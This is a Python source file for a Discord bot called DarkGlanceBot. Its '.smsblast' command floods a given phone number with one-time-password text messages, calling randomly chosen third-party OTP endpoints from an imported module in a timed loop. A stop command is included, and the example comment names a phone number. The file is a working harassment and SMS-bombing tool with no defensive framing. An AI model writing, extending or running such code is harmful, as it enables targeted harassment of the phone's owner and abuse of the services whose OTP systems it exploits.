import discord
from discord.ext import commands
from random import choice
import otp_sites
import asyncio

from sys import path
from os import getcwd
path.append(getcwd().rstrip('sms_blaster'))
from logger.logger import logger
from darkglance import check_auth,discord_

client = commands.Bot(command_prefix = '.')

sms_sent = 0
stop = False

@client.event
async def on_ready():
    print("\nServer has been started")
    print("DarkGlanceBot is ready blast sms")


@client.command(aliases = ['smsb'])
async def smsblast(ctx):#.smsblast 9566782699 2 5
    global sms_sent, stop
    
    logger.discord_input_sms_blast(ctx, getcwd().rstrip('sms_blaster') + '\logger')

    if not await check_auth(ctx, ('owner', 'admin')):
        return

    command = ctx.message.content.split()

    try:
        ph_num = command[1]
    except:
        embed = discord.Embed(title = 'Phone number not entered or Invalid input', color = 0xffffff)
        await ctx.send(embed = embed)
        return

    try:
        count = command[2]
    except:
        embed = discord.Embed(title = 'Count not entered or Invalid input', color = 0xffffff)
        await ctx.send(embed = embed)
        return

    try:
        delay = int(command[3])
    except:
        delay = 10
    
    embed = discord.Embed(title = 'SMS Blasting..', description =  f'Number : {ph_num}\nCount : {count}\nDelay : {delay}', color = 0xffffff)
    await ctx.send(embed = embed)

    
    for count_ in range(int(count)):
        if stop:
            stop = False
            break

        choice(otp_sites.sites)(ph_num)
        sms_sent += 1

        await asyncio.sleep(delay)
    else:
        embed = discord.Embed(title = 'SMS Blasted', description =  f'Number : {ph_num}\n{sms_sent} sms sent', color = 0xffffff)
        await ctx.send(embed = embed)
        
        sms_sent = 0


@client.command()
async def stopsms(ctx):
    global sms_sent, stop
    if not await check_auth(ctx, ('owner', 'admin')):
         return
    embed = discord.Embed(title = 'SMS Blasting stopped', description =  f'{sms_sent} sms sent', color = 0xffffff)
    await ctx.send(embed = embed)  
    sms_sent = 0          
    stop = True






############################
##------------------------##
client.run(discord_.token)##
##------------------------##
############################

    
